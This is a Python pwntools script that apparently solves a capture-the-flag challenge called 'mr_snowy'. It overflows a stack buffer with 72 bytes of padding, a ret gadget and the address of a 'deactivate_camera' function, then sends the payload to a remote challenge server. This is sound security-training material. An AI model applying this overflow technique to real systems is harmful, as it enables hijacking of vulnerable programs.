from pwn import *

elf = context.binary = ELF("./mr_snowy", checksec=False)
ip = "178.62.113.205"
port = 31683

address = elf.sym['deactivate_camera'] #function we want to return to
log.info("Deactivate_camera address: {}".format(p64(address)))

payload = b"A" * 72
payload += p64(0x000000000040087e) #address of ret, found with ropper -f mr_snowy --search ret
payload += p64(address)

log.info("Payload: {}".format(payload))

#s = process('./mr_snowy')
s = remote(ip, port)

try:
    while True:
        print(s.recv(1024).decode("utf-8", "ignore"))
except KeyboardInterrupt:
    print('interrupted!')

s.send("1".encode())

try:
    while True:
        print(s.recv(1024).decode("utf-8", "ignore"))
except KeyboardInterrupt:
    print('interrupted!')

s.send(payload)

try:
    while True:
    	print("hmm")
    	print(s.recv(1024).decode("utf-8", "ignore"))
    	sleep(50)
except KeyboardInterrupt:
    print('interrupted!')